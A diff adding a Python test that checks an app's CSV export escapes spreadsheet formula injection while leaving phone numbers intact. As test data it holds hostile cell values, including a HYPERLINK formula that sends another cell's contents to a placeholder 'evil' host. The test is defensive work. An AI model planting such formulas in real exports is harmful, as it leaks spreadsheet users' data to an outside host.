@@ -355,6 +355,48 @@ def test_export_csv_zip_files(
     assert rows("duplicate_dismissal") == []
 
 
+def test_export_csv_neutralises_formulas_but_keeps_phone_numbers(
+    client: TestClient, conn: psycopg.Connection[Any], network: NetworkFixture
+) -> None:
+    hostile = person(
+        conn, network, "=1+1", headline='=HYPERLINK("https://evil/?"&D2,"x")', city="@SUM(A1)"
+    )
+    conn.execute(
+        "insert into social_link (network_id, person_id, kind, url)"
+        " values (%s, %s, 'website', '@x')",
+        (network.network_id, hostile),
+    )
+    for value in ("+201012345678", "+20 10 1234 5678", "+1+1"):
+        conn.execute(
+            "insert into contact_value (network_id, person_id, kind, value)"
+            " values (%s, %s, 'phone', %s)",
+            (network.network_id, hostile, value),
+        )
+
+    archive = zipfile.ZipFile(
+        io.BytesIO(client.get("/api/v1/export", params={"format": "csv"}).content)
+    )
+    raw = {name: archive.read(name).decode("utf-8") for name in archive.namelist()}
+
+    def rows(table: str) -> list[dict[str, str]]:
+        return list(csv.DictReader(io.StringIO(raw[f"{table}.csv"], newline="")))
+
+    row = next(p for p in rows("person") if p["id"] == str(hostile))
+    assert row["name_latin"] == "'=1+1"
+    assert row["headline"] == '\'=HYPERLINK("https://evil/?"&D2,"x")'
+    assert row["city"] == "'@SUM(A1)"
+    assert rows("social_link")[0]["url"] == "'@x"
+    values = {v["value"] for v in rows("contact_value")}
+    # Phone-like cells are untouched, byte for byte; a '+' that could start a formula is not.
+    assert values == {"+201012345678", "+20 10 1234 5678", "'+1+1"}
+
+    # JSON is the lossless format: the same values, unquoted.
+    document = client.get("/api/v1/export", params={"format": "json"}).json()
+    names = {p["name_latin"] for p in document["tables"]["person"]}
+    assert "=1+1" in names
+    assert {v["value"] for v in document["tables"]["contact_value"]} >= {"+1+1"}
+
+
 def test_export_covers_every_table_of_the_schema(conn: psycopg.Connection[Any]) -> None:
     """A table added by a later migration must be added to the export, not silently left out."""
     rows = conn.execute(
